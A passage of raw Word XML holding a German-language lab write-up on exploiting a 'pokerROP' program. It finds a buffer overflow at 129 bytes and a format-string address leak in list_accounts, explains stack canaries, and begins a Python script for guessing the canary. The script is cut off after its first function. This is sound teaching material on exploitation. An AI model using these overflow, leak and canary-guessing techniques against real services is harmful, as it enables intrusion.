        <w:t xml:space="preserve">Sobald ich 200 a’s übergeben hatte wurde ich aus der Anwendung geworfen, daher vermutete ich, dass sich hier ein </w:t>
      </w:r>
      <w:r w:rsidR="002904CE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>potenzieller</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> BOF verstecken könnte.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B916861" w14:textId="07866494" w:rsidR="00160B3A" w:rsidRPr="00B47CB9" w:rsidRDefault="00160B3A" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49CD2BA6" w14:textId="5C62A7E2" w:rsidR="008B2D00" w:rsidRPr="00B47CB9" w:rsidRDefault="008B2D00" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5320AA4B" wp14:editId="4794F5E0">
            <wp:extent cx="5759450" cy="495300"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="97" name="Grafik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759450" cy="495300"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FCF8063" w14:textId="667D3665" w:rsidR="00E51469" w:rsidRPr="00B47CB9" w:rsidRDefault="00E51469" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C9CB820" w14:textId="415006E3" w:rsidR="00E51469" w:rsidRPr="00B47CB9" w:rsidRDefault="00E51469" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ich hab dann </w:t>
      </w:r>
      <w:r w:rsidR="00AD7090" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">nach und nach die Eingabe verändert und habe festgestellt, dass ich bei 128 </w:t>
      </w:r>
      <w:r w:rsidR="00EB4392" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>a‘s noch keine Meldung bekomme (siehe Abbildung).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63473600" w14:textId="3DEF89D2" w:rsidR="00883DF6" w:rsidRPr="00B47CB9" w:rsidRDefault="00883DF6" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="298725BE" w14:textId="71C16D31" w:rsidR="00883DF6" w:rsidRPr="00B47CB9" w:rsidRDefault="00883DF6" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="55589DCF" wp14:editId="69C6EF53">
            <wp:extent cx="5759450" cy="424815"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="112" name="Grafik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759450" cy="424815"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2486D8E1" w14:textId="643AEEC0" w:rsidR="0023201B" w:rsidRPr="00B47CB9" w:rsidRDefault="0023201B" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43E632BC" w14:textId="50243AD3" w:rsidR="0023201B" w:rsidRPr="00B47CB9" w:rsidRDefault="0023201B" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Sobald ich </w:t>
      </w:r>
      <w:r w:rsidR="00A9103D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">129 a’s gesendet habe wurde festgestellt, dass </w:t>
      </w:r>
      <w:r w:rsidR="002F0FF0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">die Meldung „… STACK SMASHING DETECTED …“ erschien. Daher ging ich davon aus, dass </w:t>
      </w:r>
      <w:r w:rsidR="00A71950" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ich an dieser Stelle die folgenden canaries ermitteln muss</w:t>
      </w:r>
      <w:r w:rsidR="002E34D5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (siehe Abbildung)</w:t>
      </w:r>
      <w:r w:rsidR="00A71950" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD6944A" w14:textId="70B03B7C" w:rsidR="00A9103D" w:rsidRPr="00B47CB9" w:rsidRDefault="00A9103D" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="37725EDB" wp14:editId="5D8B7E12">
            <wp:extent cx="5759450" cy="446405"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="113" name="Grafik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59450" cy="446405"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E7041A" w14:textId="40951D41" w:rsidR="003F5815" w:rsidRPr="00B47CB9" w:rsidRDefault="003F5815" w:rsidP="00EA2CBB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33902F37" w14:textId="58AA9F71" w:rsidR="003F5815" w:rsidRPr="00B47CB9" w:rsidRDefault="00C07E8E" w:rsidP="00EA2CBB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Als nächstes </w:t>
      </w:r>
      <w:r w:rsidR="000651AC" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">kompilierte ich die pokerROP.c Datei mit dem </w:t>
      </w:r>
      <w:r w:rsidR="00467BF6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Warning und dem Befehel „</w:t>
      </w:r>
      <w:r w:rsidR="00467BF6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>gcc -Wall -Wformat-security pokerROP.c -L . -linetsec -Wl,-R./“</w:t>
      </w:r>
      <w:r w:rsidR="006D3057" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (siehe Abbildung).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10AF286A" w14:textId="4866EB28" w:rsidR="003F5815" w:rsidRPr="00B47CB9" w:rsidRDefault="006D3057" w:rsidP="00EA2CBB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Dabei stelle ich fest, dass diese </w:t>
      </w:r>
      <w:r w:rsidR="003F162B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>in der Funktion „list accounts“ bei</w:t>
      </w:r>
      <w:r w:rsidR="004C0288" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">m Parameter innerhalb von printf </w:t>
      </w:r>
      <w:r w:rsidR="003F162B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>anschlug (siehe Abbildung)</w:t>
      </w:r>
      <w:r w:rsidR="00760CD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0359D3FD" w14:textId="591D60FB" w:rsidR="002E34D5" w:rsidRPr="00B47CB9" w:rsidRDefault="006D3057" w:rsidP="00EA2CBB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7E51BAFC" wp14:editId="4B16B583">
            <wp:extent cx="5759450" cy="370840"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="118" name="Grafik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59450" cy="370840"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="571E6F99" w14:textId="45AC286F" w:rsidR="004C0288" w:rsidRPr="00B47CB9" w:rsidRDefault="004C0288" w:rsidP="00EA2CBB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7897FAB8" w14:textId="4F26F4D6" w:rsidR="004C0288" w:rsidRPr="00B47CB9" w:rsidRDefault="004C0288" w:rsidP="00EA2CBB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Also legte ich einen Member mit „AM“ and und </w:t>
      </w:r>
      <w:r w:rsidR="008D5A83" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">gab diesem Namen, Membership und Expiration Date. Anschließend </w:t>
      </w:r>
      <w:r w:rsidR="00CA4ED6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>führte ich die Funktion list_accounts mit Übergabe von „L“ auf und erhielt folgendes Ergebnis (siehe Abbildung).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EEF3D93" w14:textId="77777777" w:rsidR="002E34D5" w:rsidRPr="00B47CB9" w:rsidRDefault="002E34D5" w:rsidP="00EA2CBB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="547A367E" w14:textId="248B858B" w:rsidR="002E34D5" w:rsidRPr="00B47CB9" w:rsidRDefault="002E34D5" w:rsidP="00EA2CBB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="648D05E8" wp14:editId="11288313">
            <wp:extent cx="4038600" cy="3705225"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="107" name="Grafik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038600" cy="3705225"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="178EEA22" w14:textId="60B8DC83" w:rsidR="00CA4ED6" w:rsidRPr="00B47CB9" w:rsidRDefault="00CA4ED6" w:rsidP="00EA2CBB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5776A4FD" w14:textId="76A75977" w:rsidR="009A6705" w:rsidRPr="00B47CB9" w:rsidRDefault="00CA4ED6" w:rsidP="00EA2CBB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Das ließ mich annehmen, dass diese Funktionen eventuell im Zusammenhang mit dem Adress Leak stehen könnte.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="034E0D10" w14:textId="77777777" w:rsidR="002E34D5" w:rsidRPr="00B47CB9" w:rsidRDefault="002E34D5" w:rsidP="00EA2CBB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61247BA1" w14:textId="2C6FB45B" w:rsidR="00D16A08" w:rsidRPr="00B47CB9" w:rsidRDefault="003721C5" w:rsidP="00EA2CBB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Als nächstes begann ich </w:t>
      </w:r>
      <w:r w:rsidR="00E51055" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>mit dem Herausfinden der canaries.</w:t>
      </w:r>
      <w:r w:rsidR="00D16A08" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Bei Stack </w:t>
      </w:r>
      <w:r w:rsidR="00E819C5">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidR="00D16A08" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">anaries handelt es sich um einen zufälligen Wert, </w:t>
      </w:r>
      <w:r w:rsidR="002C7F70" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">der vor der Return Adresse am Stack eingefügt und </w:t>
      </w:r>
      <w:r w:rsidR="00ED6CCC" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">überprüft wird. Sollte der canary einen anderen Wert aufweisen, so wurde dieser überschreiben und die Anwendung </w:t>
      </w:r>
      <w:r w:rsidR="003E7C0B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>terminiert.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EAD4676" w14:textId="77777777" w:rsidR="00D16A08" w:rsidRPr="00B47CB9" w:rsidRDefault="00D16A08" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23F60614" w14:textId="4FA7AD39" w:rsidR="006F5596" w:rsidRPr="00B47CB9" w:rsidRDefault="00E51055" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ich dachte mir durch, wie die </w:t>
      </w:r>
      <w:r w:rsidR="00A5509C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Programmfluss aussieht und kam auf folgende Vorgehensweise:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038D6D83" w14:textId="63AEE406" w:rsidR="00A5509C" w:rsidRPr="00B47CB9" w:rsidRDefault="00A5509C" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="476EA52D" w14:textId="640E42A2" w:rsidR="00A5509C" w:rsidRPr="00B47CB9" w:rsidRDefault="00A5509C" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>1. Verbindungsaufbau</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="121F275B" w14:textId="77D2A7FA" w:rsidR="00A5509C" w:rsidRPr="00B47CB9" w:rsidRDefault="00A5509C" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r w:rsidR="00051532" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Login</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521E7886" w14:textId="026D0247" w:rsidR="00B67F27" w:rsidRPr="00B47CB9" w:rsidRDefault="00051532" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r w:rsidR="00B67F27" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Buffer mit dem Parameter ‚u‘ mitschicken</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AFD1BAF" w14:textId="0EC4D377" w:rsidR="00B67F27" w:rsidRPr="00B47CB9" w:rsidRDefault="00B67F27" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">4. Überprüfen, ob </w:t>
      </w:r>
      <w:r w:rsidR="00764E77" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>im Response der Wert ‚</w:t>
      </w:r>
      <w:r w:rsidR="00754A55" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>RED</w:t>
      </w:r>
      <w:r w:rsidR="00764E77" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>‘ enthalten ist.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75092D42" w14:textId="7C1A40C6" w:rsidR="00764E77" w:rsidRPr="00B47CB9" w:rsidRDefault="00764E77" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="041ABBC0" w14:textId="544F3B4F" w:rsidR="00F415A5" w:rsidRPr="00B47CB9" w:rsidRDefault="00764E77" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Die</w:t>
      </w:r>
      <w:r w:rsidR="0045486E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00F415A5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> löste ich </w:t>
      </w:r>
      <w:r w:rsidR="002D027C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">grundlegend </w:t>
      </w:r>
      <w:r w:rsidR="00F415A5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>wie folgt</w:t>
      </w:r>
      <w:r w:rsidR="00737AFE">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (vorgehen oben beschreiben)</w:t>
      </w:r>
      <w:r w:rsidR="00F415A5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C3EEF7" w14:textId="1B7E0038" w:rsidR="00764E77" w:rsidRPr="00B47CB9" w:rsidRDefault="00764E77" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00764E77" w:rsidRPr="00B47CB9" w14:paraId="32CA1E85" w14:textId="77777777" w:rsidTr="00764E77">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0F432E4D" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#!/usr/bin/python</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F53FC98" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>import socket</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="740E04AB" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>import time</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58D60FD4" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="272A0DA9" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>def checkResponse(res):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="135AD77A" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    time.sleep(0.5)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F0916F3" w14:textId="1DB4892A" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    badRes = </w:t>
            </w:r>
            <w:r w:rsidR="0019595A">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>‘</w:t>
            </w:r>
            <w:r w:rsidR="00395D28" w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>RED</w:t>
            </w:r>
            <w:r w:rsidR="0019595A">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>’</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3AC22186" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    if badRes in res:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="448CE2D4" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        return 0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BE6ADFD" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    else:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BADADFC" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        return 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20F865C1" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="74646258" w14:textId="77777777" w:rsidR="000C3276" w:rsidRPr="008E2D33" w:rsidRDefault="000C3276" w:rsidP="000C3276">
            <w:pPr>
              <w:rPr>
